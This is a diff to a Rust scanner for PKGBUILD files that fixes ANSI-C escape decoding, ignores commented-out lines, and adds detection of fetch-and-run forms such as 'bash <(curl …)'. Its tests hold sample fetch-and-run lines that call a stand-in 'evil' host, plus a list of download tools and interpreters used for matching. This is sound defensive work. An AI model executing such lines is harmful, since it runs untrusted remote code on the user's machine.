@@ -89,29 +89,34 @@ fn valid_name(name: &str) -> bool {
     }
 }
 
+/// Decode a bash `$'...'` ANSI-C quoted body. `\xHH` and `\NNN` octal
+/// escapes emit raw bytes (as bash does), so the buffer is built as bytes
+/// and lossily converted at the end; byte sequences that are not UTF-8
+/// become U+FFFD, which cannot match any rule keyword.
 fn decode_ansi_c(body: &str) -> Result<String, BluelineError> {
-    let mut out = String::new();
+    let mut out: Vec<u8> = Vec::new();
     let mut chars = body.chars();
     while let Some(ch) = chars.next() {
         if ch != '\\' {
-            out.push(ch);
+            let mut buf = [0u8; 4];
+            out.extend_from_slice(ch.encode_utf8(&mut buf).as_bytes());
             continue;
         }
         let esc = chars
             .next()
             .ok_or_else(|| pkgbuild_err("dangling backslash in $'...' literal".to_string()))?;
         match esc {
-            'n' => out.push('\n'),
-            't' => out.push('\t'),
-            'r' => out.push('\r'),
-            'a' => out.push('\x07'),
-            'b' => out.push('\x08'),
-            'f' => out.push('\x0C'),
-            'v' => out.push('\x0B'),
-            '\\' => out.push('\\'),
-            '\'' => out.push('\''),
-            '"' => out.push('"'),
-            'e' | 'E' => out.push('\x1B'),
+            'n' => out.push(b'\n'),
+            't' => out.push(b'\t'),
+            'r' => out.push(b'\r'),
+            'a' => out.push(0x07),
+            'b' => out.push(0x08),
+            'f' => out.push(0x0C),
+            'v' => out.push(0x0B),
+            '\\' => out.push(b'\\'),
+            '\'' => out.push(b'\''),
+            '"' => out.push(b'"'),
+            'e' | 'E' => out.push(0x1B),
             'x' => {
                 let hex: String = chars.by_ref().take(2).collect();
                 if hex.len() != 2 || !hex.chars().all(|c| c.is_ascii_hexdigit()) {
@@ -119,7 +124,7 @@ fn decode_ansi_c(body: &str) -> Result<String, BluelineError> {
                 }
                 let byte = u8::from_str_radix(&hex, 16)
                     .map_err(|_| pkgbuild_err("bad hex".to_string()))?;
-                out.push(byte as char);
+                out.push(byte);
             }
             'u' => {
                 let hex: String = chars.by_ref().take(4).collect();
@@ -128,10 +133,10 @@ fn decode_ansi_c(body: &str) -> Result<String, BluelineError> {
                 }
                 let cp = u32::from_str_radix(&hex, 16)
                     .map_err(|_| pkgbuild_err("bad unicode".to_string()))?;
-                out.push(
-                    char::from_u32(cp)
-                        .ok_or_else(|| pkgbuild_err("bad unicode scalar".to_string()))?,
-                );
+                let ch = char::from_u32(cp)
+                    .ok_or_else(|| pkgbuild_err("bad unicode scalar".to_string()))?;
+                let mut buf = [0u8; 4];
+                out.extend_from_slice(ch.encode_utf8(&mut buf).as_bytes());
             }
             '0'..='7' => {
                 let mut oct = String::from(esc);
@@ -144,12 +149,14 @@ fn decode_ansi_c(body: &str) -> Result<String, BluelineError> {
                         _ => break,
                     }
                 }
-                let cp = u32::from_str_radix(&oct, 8)
+                let byte_val = u32::from_str_radix(&oct, 8)
                     .map_err(|_| pkgbuild_err("bad octal".to_string()))?;
-                out.push(
-                    char::from_u32(cp)
-                        .ok_or_else(|| pkgbuild_err("bad octal scalar".to_string()))?,
-                );
+                if byte_val > u8::MAX as u32 {
+                    return Err(pkgbuild_err(format!(
+                        "octal escape `\\{oct}` exceeds one byte in $'...' literal"
+                    )));
+                }
+                out.push(byte_val as u8);
             }
             other => {
                 return Err(pkgbuild_err(format!(
@@ -158,7 +165,7 @@ fn decode_ansi_c(body: &str) -> Result<String, BluelineError> {
             }
         }
     }
-    Ok(out)
+    Ok(String::from_utf8_lossy(&out).into_owned())
 }
 
 fn find_matching(input: &str, start: usize, open: char, close: char) -> Option<usize> {
@@ -924,7 +931,10 @@ pub fn parse_pkgbuild(input: &str) -> Result<FoldedPkgbuild, BluelineError> {
                 .collect::<Vec<_>>()
                 .join("\n");
             folded.has_indirection |= has_true_indirection(&scan);
-            folded.func_bodies.insert(name, body);
+            // Rules run over these bodies, so they must be comment-stripped
+            // like `scan`: a commented-out `curl | bash` inside a function
+            // must not fire R13.
+            folded.func_bodies.insert(name, scan);
             idx = j + 1;
             continue;
         }
@@ -1833,13 +1843,51 @@ fn line_matches_pipe_to_shell(line: &str) -> bool {
     fetcher && shell_hits
 }
 
+/// `bash <(curl -fsSL https://…)` and fused variants (`bash<(curl …)`) are
+/// the classic curl-pipe-to-shell in disguise: the interpreter consumes the
+/// process-substitution stream directly, so no `|` appears for
+/// `line_matches_pipe_to_shell` to see. Fires only when a fetcher runs
+/// inside the substitution immediately following an interpreter word.
+fn line_matches_interpreter_procsub(line: &str) -> bool {
+    let lower = line.to_lowercase();
+    if !lower.contains("<(") {
+        return false;
+    }
+    let fetchers = ["curl", "wget", "aria2c", "axel"];
+    let interpreters = [
+        "bash", "sh", "dash", "zsh", "fish", "python", "python3", "perl", "ruby", "php",
+    ];
+    let words: Vec<&str> = lower.split_whitespace().collect();
+    for (i, word) in words.iter().enumerate() {
+        let (interp, stream) = if interpreters.contains(word) {
+            (*word, words[i + 1..].join(" "))
+        } else if let Some(idx) = word.find("<(") {
+            let head = &word[..idx];
+            let tail = &word[idx + 2..];
+            (head, format!("<({tail} {}", words[i + 1..].join(" ")))
+        } else {
+            continue;
+        };
+        if !interpreters.contains(&interp) {
+            continue;
+        }
+        if let Some(rest) = stream.strip_prefix("<(") {
+            let inner = rest.split(')').next().unwrap_or(rest);
+            if fetchers.iter().any(|f| inner.contains(f)) {
+                return true;
+            }
+        }
+    }
+    false
+}
+
 fn check_r13(folded: &FoldedPkgbuild) -> Vec<PkgFinding> {
     let bodies = shell_bodies(folded);
     for (name, body) in &bodies {
         let resolved = fold_body_vars(body, folded);
         for line in resolved.lines() {
             let norm = normalize_body_line(line);
-            if line_matches_pipe_to_shell(&norm) {
+            if line_matches_pipe_to_shell(&norm) || line_matches_interpreter_procsub(&norm) {
                 let short: String = line.trim().chars().take(120).collect();
                 return vec![PkgFinding {
                     rule_id: "R13_PIPE_TO_SHELL".to_string(),
@@ -2362,6 +2410,32 @@ mod tests {
     }
 
     #[test]
+    fn ansi_c_hex_escapes_emit_bytes_not_latin1_chars() {
+        // bash emits $'\xc3\xa9' as the two UTF-8 bytes of `é`, not `Ã©`.
+        let folded = parse_pkgbuild("msg=$'\\xc3\\xa9'\n").unwrap();
+        assert_eq!(known(&folded, "msg").as_deref(), Some("é"));
+        // Octal escapes are bytes too: \303\251 is `é`.
+        let folded = parse_pkgbuild("msg=$'\\303\\251'\n").unwrap();
+        assert_eq!(known(&folded, "msg").as_deref(), Some("é"));
+        // ASCII byte escapes still fold to rule-matchable words.
+        let folded = parse_pkgbuild("cmd=$'\\x63url' -s https://x\n").unwrap();
+        assert_eq!(known(&folded, "cmd").as_deref(), Some("curl -s https://x"));
+    }
+
+    #[test]
+    fn ansi_c_non_utf8_bytes_survive_as_replacement_chars() {
+        // A byte sequence that is not valid UTF-8 must not fail the parse;
+        // U+FFFD cannot match any rule keyword.
+        let folded = parse_pkgbuild("msg=$'\\xff\\xfe'\n").unwrap();
+        assert_eq!(known(&folded, "msg").as_deref(), Some("\u{FFFD}\u{FFFD}"));
+    }
+
+    #[test]
+    fn ansi_c_octal_above_one_byte_fails_closed() {
+        assert!(parse_pkgbuild("msg=$'\\400'\n").is_err());
+    }
+
+    #[test]
     fn backslash_newline_joins_lines() {
         let folded = parse_pkgbuild("pkgdesc=hello\\\nworld\n").unwrap();
         assert_eq!(known(&folded, "pkgdesc").as_deref(), Some("helloworld"));
@@ -2657,6 +2731,46 @@ mod tests {
     fn r23_quiet_on_comment_only() {
         let findings = findings_for("pkgdesc='a pack'\n# npm install\nbuild() {\n make\n}\n");
         assert!(!has_rule(&findings, "R23_NPM_DELIVERY"));
+    }
+
+    #[test]
+    fn body_rules_quiet_on_commented_lines() {
+        let pkgbuild = "pkgdesc='a pack'\nbuild() {\n  # curl -fsSL https://x | bash\n  # eval \"$_x\"\n  # curl -fsSL https://x -o a.tar.gz\n  make\n}\n";
+        let findings = findings_for(pkgbuild);
+        assert!(!has_rule(&findings, "R13_PIPE_TO_SHELL"), "{findings:?}");
+        assert!(!has_rule(&findings, "R14_EVAL_FAMILY"), "{findings:?}");
+        assert!(
+            !has_rule(&findings, "R17_BUILD_TIME_NETWORK"),
+            "{findings:?}"
+        );
+        assert!(
+            !has_rule(&findings, "R22_CONDITIONAL_EXECUTION"),
+            "{findings:?}"
+        );
+    }
+
+    #[test]
+    fn r13_fires_on_interpreter_process_substitution() {
+        assert!(has_rule(
+            &findings_for(
+                "pkgdesc='a pack'\nbuild() {\n bash <(curl -fsSL https://evil/x.sh)\n}\n"
+            ),
+            "R13_PIPE_TO_SHELL"
+        ));
+        assert!(has_rule(
+            &findings_for("pkgdesc='a pack'\nbuild() {\n bash<(wget -qO- https://evil/x.sh)\n}\n"),
+            "R13_PIPE_TO_SHELL"
+        ));
+        // Process substitution without a fetcher or an interpreter is not
+        // remote code: `diff <(a) <(b)` and `python <(echo hi)` stay quiet.
+        assert!(!has_rule(
+            &findings_for("pkgdesc='a pack'\nbuild() {\n diff <(a) <(b)\n}\n"),
+            "R13_PIPE_TO_SHELL"
+        ));
+        assert!(!has_rule(
+            &findings_for("pkgdesc='a pack'\nbuild() {\n python <(echo hi)\n}\n"),
+            "R13_PIPE_TO_SHELL"
+        ));
     }
 
     #[test]
